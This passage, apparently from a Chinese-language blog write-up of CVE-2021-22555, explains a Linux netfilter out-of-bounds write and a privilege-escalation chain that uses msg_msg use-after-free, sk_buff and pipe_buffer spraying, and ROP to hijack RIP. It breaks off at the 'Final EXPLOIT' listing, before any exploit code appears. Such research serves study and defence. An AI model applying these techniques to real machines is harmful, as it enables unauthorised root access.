class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_target</span> *<span class="title">ct</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_target *)t;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line"><span class="type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(t-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">t = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(t, ct, <span class="keyword">sizeof</span>(*ct));</span><br><span class="line"><span class="keyword">if</span> (target-&gt;compat_from_user)</span><br><span class="line">target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="keyword">sizeof</span>(*ct));</span><br><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);<span class="comment">// 漏洞产生点</span></span><br><span class="line"></span><br><span class="line">tsize += off;</span><br><span class="line">t-&gt;u.user.target_size = tsize;</span><br><span class="line">strlcpy(name, target-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(target-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="keyword">sizeof</span>(t-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += tsize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_target_from_user);</span><br></pre></td></tr></table></figure><p>理想情况下，应该是按照如下方式进行清零的，看起来好像没有什么问题？（下图例子中假设 targetsize 小于 8）</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>但是 t-&gt;data 并不一定是 8 字节对齐的，而我们计算 pad 时却默认 t-&gt;data 应当 8 字节对齐</strong>，因此若 t-&gt;data 并非 8 字节对齐，而 pad 计算时向上与 8  字节对齐，<strong>就会导致越界写入数字节的 0 到相邻的下一个 object 中</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>这里笔者对公开的 exp 进行调试，可以看到的是 t-&gt;data <strong>确乎可以为一个非 8 字节对齐的地址，而此时 target-&gt;targetsize 再向上对 8 字节对齐，自然就会越界写到相邻下一 object 的开头</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>在 <code>xt_compat_match_from_user()</code> 中产生的漏洞逻辑相同，这里就不赘叙了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_match_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_match *m, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span> =</span> m-&gt;u.kernel.match;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_match</span> *<span class="title">cm</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_match *)m;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_match_offset(match);</span><br><span class="line"><span class="type">u_int16_t</span> msize = cm-&gt;u.user.match_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(m-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">m = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(m, cm, <span class="keyword">sizeof</span>(*cm));</span><br><span class="line"><span class="keyword">if</span> (match-&gt;compat_from_user)</span><br><span class="line">match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="keyword">sizeof</span>(*cm));</span><br><span class="line">pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="number">0</span>, pad); <span class="comment">// 漏洞产生点</span></span><br><span class="line"></span><br><span class="line">msize += off;</span><br><span class="line">m-&gt;u.user.match_size = msize;</span><br><span class="line">strlcpy(name, match-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(match-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="keyword">sizeof</span>(m-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += msize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_match_from_user);</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>接下来我们来考虑如何利用这个越界写 0 的漏洞，现在公开的这一份 exp 利用 <code>msg_msg</code> 构造 UAF、利用 <code>sk_buff</code> 写入 object、利用 <code>pipe_buffer</code> 劫持 RIP，笔者认为这是一个很好的思路，所以后面笔者构造 exp 也会遵循同样的思路完成</p><blockquote><p>下面的图例大部分来自 <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google 的 security research 博客</a>，非常感谢 Google 做出了如此简单易懂的图例！</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-O-开始前的准备工作"><a href="#Step-O-开始前的准备工作" class="headerlink" title="Step.O 开始前的准备工作"></a>Step.O 开始前的准备工作</h3><p>为了触发到漏洞的路径，我们应当使用 <code>unshare()</code> 隔离出对应的的命名空间，同时为了提高堆喷的稳定性，我们将进程绑定到固定核心上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">CPU_ZERO(&amp;cpu_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br></pre></td></tr></table></figure><blockquote><p>如果不隔离出独立命名空间的话<strong>便不会走到触发漏洞的路径</strong>，因为我们需要 <code>CAP_SYS_ADMIN</code> 权限，作为普通用户只能通过命名空间隔离进行获取</p></blockquote><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上 off-by-one，我们该怎么利用呢？比较朴素的一种思想便是覆写一个头部为指针的结构体，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 0x1000，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息，再利用 setsockopt 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>这样就会导致 <code>xt_table_info</code> 结构体覆写到其相邻的主消息的 next 指针，从而导致<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span 